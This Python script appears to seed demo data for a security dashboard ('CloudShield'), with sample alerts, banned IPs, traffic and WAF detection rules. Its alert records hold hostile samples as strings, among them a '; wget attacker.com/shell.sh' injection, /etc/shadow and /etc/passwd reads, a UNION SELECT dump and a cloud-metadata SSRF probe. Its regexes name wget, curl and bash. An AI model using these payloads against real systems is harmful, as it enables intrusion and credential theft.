"""
CloudShield Demo Data Seeder
Populates the database with rich, realistic security event data
"""
import sqlite3
import os
import json
import random
from datetime import datetime, timedelta

DB_DIR = "data" if not os.path.exists("/app/data") else "/app/data"
DB_PATH = os.path.join(DB_DIR, "security.db")

os.makedirs(DB_DIR, exist_ok=True)

# ─── Seed Data ────────────────────────────────────────────────────────────────

ATTACK_IPS = [
    ("221.228.1.9",   "China"),
    ("95.104.2.14",   "Russia"),
    ("185.220.101.5", "Netherlands"),
    ("198.51.100.4",  "USA"),
    ("45.33.32.156",  "USA"),
    ("103.21.244.0",  "India"),
    ("46.161.27.72",  "Ukraine"),
    ("77.83.247.1",   "Germany"),
]

ATTACKS = [
    ("SQL Injection",            "/login",           "POST",  "HIGH",     "Autonomous block: SQL Injection payload detected in POST body."),
    ("SQL Injection",            "/search",          "GET",   "HIGH",     "Autonomous block: UNION SELECT injection attempt in query string."),
    ("Cross-Site Scripting",     "/register",        "POST",  "HIGH",     "Autonomous block: XSS payload <script>alert(1)</script> detected."),
    ("Cross-Site Scripting",     "/comment",         "POST",  "MEDIUM",   "Stored XSS attempt via comment field."),
    ("Path Traversal (LFI)",     "/index",           "GET",   "HIGH",     "Autonomous block: Path traversal ../../etc/passwd detected."),
    ("Honeypot Discovery",       "/admin",           "GET",   "MEDIUM",   "Attacker redirected to honeypot decoy: /admin endpoint probe."),
    ("Honeypot Command Exec",    "/admin/execute",   "POST",  "CRITICAL", "Attacker executed shell command 'id' inside honeypot environment."),
    ("Brute Force Login",        "/login",           "POST",  "HIGH",     "Brute force: 47 failed login attempts from same IP in 60 seconds."),
    ("SSRF Attempt",             "/api/fetch",       "POST",  "CRITICAL", "Server-Side Request Forgery: Internal metadata endpoint probed."),
    ("Command Injection",        "/ping",            "POST",  "CRITICAL", "OS command injection detected: ; cat /etc/shadow in ping field."),
    ("Open Redirect",            "/redirect",        "GET",   "MEDIUM",   "Unvalidated redirect to external phishing domain detected."),
    ("XML Injection",            "/api/parse",       "POST",  "MEDIUM",   "XXE (XML External Entity) payload detected in request body."),
]

TRAFFIC_PATHS = [
    ("/", "GET", "PASS", None, 200),
    ("/login", "GET", "PASS", None, 200),
    ("/register", "GET", "PASS", None, 200),
    ("/dashboard", "GET", "PASS", None, 200),
    ("/api/users", "GET", "PASS", None, 200),
    ("/static/main.css", "GET", "PASS", None, 200),
    ("/admin", "GET", "DECEPTION", "Honeypot Decoy", 302),
    ("/wp-admin", "GET", "DECEPTION", "Honeypot Decoy", 302),
    ("/login", "POST", "BLOCK", "SQL Injection", 403),
    ("/search", "GET", "BLOCK", "SQL Injection", 403),
    ("/register", "POST", "BLOCK", "XSS Filter", 403),
    ("/index", "GET", "BLOCK", "Path Traversal", 403),
]

BANNED_IPS = [
    ("185.220.101.5", "Autonomous Firewall Ban: 7 alerts – CRITICAL honeypot command execution."),
    ("95.104.2.14",   "Autonomous Firewall Ban: 5 alerts – Repeated SQL injection attempts."),
    ("221.228.1.9",   "Autonomous Firewall Ban: 6 alerts – XSS + path traversal attacks."),
    ("198.51.100.4",  "Autonomous Firewall Ban: 9 alerts – Repeated honeypot directory probes."),
    ("45.33.32.156",  "Autonomous Firewall Ban: Brute force login threshold exceeded (47 attempts)."),
    ("46.161.27.72",  "Autonomous Firewall Ban: Command injection exploit attempt on /ping endpoint."),
    ("77.83.247.1",   "Autonomous Firewall Ban: Directory scanner Nessus signatures identified."),
    ("103.21.244.15", "Autonomous Firewall Ban: 6 warnings – Persistent XML injection attempts."),
    ("192.0.2.55",    "Autonomous Firewall Ban: SSRF probe on internal AWS metadata registry."),
    ("80.82.77.3",    "Autonomous Firewall Ban: Repeated comment-field XSS injections."),
    ("37.49.224.12",  "Autonomous Firewall Ban: TOR exit node probing /admin paths."),
    ("185.220.101.47", "Autonomous Firewall Ban: Path traversal scan (/etc/passwd)."),
    ("93.174.93.18",  "Autonomous Firewall Ban: Bruteforcing login with SQLi bypass payload.")
]

WAF_RULES = [
    ("SQL Injection",           r"(?i)(UNION\s+SELECT|UNION\s+ALL\s+SELECT|' OR 1=1|--|/\*|\*/|OR\s+'\w+'\s*=\s*'\w+')", "QUERY_OR_BODY", "HIGH"),
    ("Cross-Site Scripting",    r"(?i)(<script|javascript:|onload\s*=|onerror\s*=|alert\(|eval\()",                       "QUERY_OR_BODY", "HIGH"),
    ("Path Traversal (LFI)",    r"(?i)(\.\.\/|\.\.\\|/etc/passwd|/windows/win\.ini)",                                    "QUERY_OR_BODY", "HIGH"),
    ("Command Injection",       r"(?i)(;|\||\`|\$\()\s*(cat|ls|id|whoami|wget|curl|bash|sh)",                            "QUERY_OR_BODY", "CRITICAL"),
    ("SSRF Protection",         r"(?i)(localhost|127\.0\.0\.1|169\.254\.169\.254|10\.\d+\.\d+\.\d+)",                    "QUERY_OR_BODY", "CRITICAL"),
    ("Scanner Detection",       r"(?i)(sqlmap|nessus|nikto|masscan|nmap|burpsuite|dirbuster)",                           "HEADERS",       "MEDIUM"),
]

def run():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()

    # ── Clear existing demo data ───────────────────────────────────────────────
    cur.execute("DELETE FROM alerts")
    cur.execute("DELETE FROM banned_ips")
    cur.execute("DELETE FROM raw_traffic")
    cur.execute("DELETE FROM waf_custom_rules")

    # ── Seed WAF Rules ─────────────────────────────────────────────────────────
    for name, pattern, field, sev in WAF_RULES:
        cur.execute(
            "INSERT OR IGNORE INTO waf_custom_rules (rule_name,pattern,target_field,severity,enabled) VALUES (?,?,?,?,1)",
            (name, pattern, field, sev)
        )
    print(f"[+] Seeded {len(WAF_RULES)} WAF rules")

    # ── Seed Alerts (50 events over past 24 hours) ────────────────────────────
    now = datetime.now()
    alert_rows = []
    for i in range(50):
        attack = random.choice(ATTACKS)
        ip, country = random.choice(ATTACK_IPS)
        minutes_ago = random.randint(1, 1440)  # up to 24h ago
        ts = (now - timedelta(minutes=minutes_ago)).isoformat()
        status = "BLOCKED" if attack[3] in ("HIGH","CRITICAL") else "LOGGED"
        details = json.dumps({"country": country, "probe_count": random.randint(1, 12)})
        alert_rows.append((ts, ip, attack[0], attack[1], attack[2], attack[3], attack[4], details, status))

    # Add a few CRITICAL ones near top
    critical_entries = [
        ((now - timedelta(minutes=5)).isoformat(),  "185.220.101.5", "Honeypot Command Exec", "/admin/execute", "POST", "CRITICAL", "Attacker executed 'cat /etc/shadow' inside honeypot.", json.dumps({"cmd":"cat /etc/shadow","country":"Netherlands"}), "LOGGED"),
        ((now - timedelta(minutes=12)).isoformat(), "95.104.2.14",   "SQL Injection",         "/login",         "POST", "CRITICAL", "Full DB dump attempted via UNION SELECT.", json.dumps({"payload":"' UNION SELECT * FROM users--","country":"Russia"}), "BLOCKED"),
        ((now - timedelta(minutes=20)).isoformat(), "46.161.27.72",  "Command Injection",      "/ping",          "POST", "CRITICAL", "Remote code execution via ping field: ; wget attacker.com/shell.sh", json.dumps({"cmd":"; wget attacker.com/shell.sh","country":"Ukraine"}), "BLOCKED"),
        ((now - timedelta(minutes=35)).isoformat(), "221.228.1.9",   "SSRF Attempt",           "/api/fetch",     "POST", "CRITICAL", "AWS metadata endpoint probed: 169.254.169.254", json.dumps({"target":"http://169.254.169.254/latest/meta-data/","country":"China"}), "BLOCKED"),
    ]
    alert_rows = critical_entries + alert_rows

    cur.executemany(
        "INSERT INTO alerts (timestamp,src_ip,attack_type,request_path,request_method,severity,description,details,status) VALUES (?,?,?,?,?,?,?,?,?)",
        alert_rows
    )
    print(f"[+] Seeded {len(alert_rows)} alerts")

    # ── Seed Banned IPs ────────────────────────────────────────────────────────
    for ip, reason in BANNED_IPS:
        ban_ts = (now - timedelta(minutes=random.randint(5, 60))).isoformat()
        cur.execute("INSERT OR REPLACE INTO banned_ips (ip,ban_time,reason) VALUES (?,?,?)", (ip, ban_ts, reason))
    print(f"[+] Seeded {len(BANNED_IPS)} banned IPs")

    # ── Seed Raw Traffic (200 entries) ─────────────────────────────────────────
    traffic_rows = []
    for i in range(200):
        path_data = random.choice(TRAFFIC_PATHS)
        ip = random.choice([x[0] for x in ATTACK_IPS] + ["127.0.0.1","10.0.0.2","10.0.0.3"])
        ts = (now - timedelta(minutes=random.randint(1, 1440))).isoformat()
        traffic_rows.append((ts, ip, path_data[0], path_data[1], path_data[2], path_data[3], path_data[4]))

    cur.executemany(
        "INSERT INTO raw_traffic (timestamp,src_ip,request_path,request_method,action,rule_matched,status_code) VALUES (?,?,?,?,?,?,?)",
        traffic_rows
    )
    print(f"[+] Seeded {len(traffic_rows)} traffic entries")

    conn.commit()
    conn.close()
    print("\n[SUCCESS] Database seeded successfully! Refresh the dashboard.")

if __name__ == "__main__":
    run()
